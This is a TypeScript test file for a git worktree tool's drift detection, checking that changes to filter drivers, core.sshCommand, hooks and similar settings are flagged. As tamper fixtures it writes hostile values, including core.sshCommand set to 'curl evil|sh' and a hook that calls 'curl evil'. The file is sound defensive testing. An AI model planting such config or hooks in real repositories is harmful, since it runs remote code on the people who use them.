// Copyright (c) 2026 Dylan Lambertson. All rights reserved.

import assert from 'node:assert/strict';
import { chmodSync, unlinkSync } from 'node:fs';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, it } from 'node:test';
import { makeFixture, sh, write, type Fixture } from './helpers.js';

describe('GIT-SNAP-1 drift detection', () => {
  let fx: Fixture;
  let wt: string;
  const common = () => path.join(fx.repo, '.git');
  const driftIds = async () => (await fx.manager.status(wt)).drift.map((d) => d.id);

  beforeEach(async () => {
    fx = makeFixture();
    wt = (await fx.manager.create({ repoPath: fx.repo, slug: 'snap' })).path;
  });
  afterEach(() => fx.cleanup());

  it('has no drift right after create', async () => {
    const st = await fx.manager.status(wt);
    assert.deepEqual(st.drift, []);
    assert.equal(st.baselineMissing, false);
  });

  it('detects an info/attributes filter driver and its config', async () => {
    write(path.join(common(), 'info', 'attributes'), '*.txt filter=evil\n');
    assert.deepEqual(await driftIds(), ['file:info/attributes']);
    sh(fx.repo, 'config', 'filter.evil.clean', 'touch /tmp/pwned');
    const ids = await driftIds();
    assert.ok(ids.includes('file:info/attributes'));
    assert.ok(ids.includes('file:config'));
    assert.ok(ids.includes('config:filter.evil.clean'));
    const item = (await fx.manager.status(wt)).drift.find((d) => d.id === 'config:filter.evil.clean');
    assert.equal(item?.change, 'added');
    assert.match(item?.after ?? '', /touch \/tmp\/pwned/);
  });

  it('detects core.sshCommand', async () => {
    sh(fx.repo, 'config', 'core.sshCommand', 'sh -c "curl evil|sh"');
    const ids = await driftIds();
    assert.ok(ids.includes('config:core.sshcommand'));
    assert.ok(ids.includes('file:config'));
  });

  it('detects core.hooksPath and core.fsmonitor', async () => {
    sh(fx.repo, 'config', 'core.hooksPath', '/tmp/evil-hooks');
    sh(fx.repo, 'config', 'core.fsmonitor', 'evil');
    const ids = await driftIds();
    assert.ok(ids.includes('config:core.hookspath'));
    assert.ok(ids.includes('config:core.fsmonitor'));
  });

  it('detects diff drivers', async () => {
    sh(fx.repo, 'config', 'diff.evil.textconv', 'cat');
    assert.ok((await driftIds()).includes('config:diff.evil.textconv'));
  });

  it('detects added, modified and removed hooks and an exec-bit change', async () => {
    const hook = path.join(common(), 'hooks', 'pre-commit');
    write(hook, '#!/bin/sh\nexit 0\n');
    assert.deepEqual(await driftIds(), ['file:hooks/pre-commit']);
    await fx.manager.acknowledgeDrift(wt);
    assert.deepEqual(await driftIds(), []);
    write(hook, '#!/bin/sh\ncurl evil\n');
    const mod = (await fx.manager.status(wt)).drift[0];
    assert.equal(mod?.change, 'modified');
    assert.match(mod?.before ?? '', /exit 0/);
    assert.match(mod?.after ?? '', /curl evil/);
    await fx.manager.acknowledgeDrift(wt);
    chmodSync(hook, 0o755);
    assert.deepEqual(await driftIds(), ['file:hooks/pre-commit']);
    await fx.manager.acknowledgeDrift(wt);
    unlinkSync(hook);
    assert.equal((await fx.manager.status(wt)).drift[0]?.change, 'removed');
  });

  it('detects config.worktree files (main and per-worktree)', async () => {
    write(path.join(common(), 'config.worktree'), '[core]\n\tsshCommand = x\n');
    assert.deepEqual(await driftIds(), ['file:config.worktree']);
    const name = path.basename(sh(wt, 'rev-parse', '--git-dir').trim());
    write(path.join(common(), 'worktrees', name, 'config.worktree'), '[core]\n\thooksPath = y\n');
    assert.deepEqual(await driftIds(), ['file:config.worktree', `file:worktrees/${name}/config.worktree`]);
  });

  it('ignores changes outside the guard set', async () => {
    write(path.join(common(), 'info', 'exclude'), 'junk\n');
    sh(fx.repo, 'config', 'user.name', 'Someone');
    sh(fx.repo, 'config', 'branch.main.description', 'x');
    const ids = await driftIds();
    assert.deepEqual(ids, ['file:config']); // the file hash changes; no watched key did
  });

  it('fails closed when the baseline is missing and honours a supplied one', async () => {
    const baseline = await fx.manager.takeGitSnapshot(wt);
    const { unlinkSync: rm } = await import('node:fs');
    rm(path.join(sh(wt, 'rev-parse', '--absolute-git-dir').trim(), 'axis-gitsnap.json'));
    const st = await fx.manager.status(wt);
    assert.equal(st.baselineMissing, true);
    assert.equal(st.hasDrift, true);
    const ok = await fx.manager.status(wt, { baseline });
    assert.equal(ok.hasDrift, false);
  });
});
